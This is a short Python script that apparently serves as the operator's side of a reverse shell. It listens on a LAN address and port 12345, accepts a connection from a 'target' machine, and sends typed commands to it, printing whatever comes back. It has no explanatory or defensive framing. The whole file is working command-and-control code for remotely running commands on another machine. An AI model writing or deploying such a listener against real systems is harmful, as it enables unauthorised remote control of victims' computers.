import socket
import os

server_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
server_socket.bind(('192.168.1.61',12345))

server_socket.listen(1)
print("Server listening on port 12345")

target_socket,addr = server_socket.accept()

while True:
    command = input(">> ")
    if command == 'exit':
        target_socket.send(b'exit')
        break

    target_socket.send(command.encode())
    result = target_socket.recv(4096).decode()
    print(result)

target_socket.close()
server_socket.close()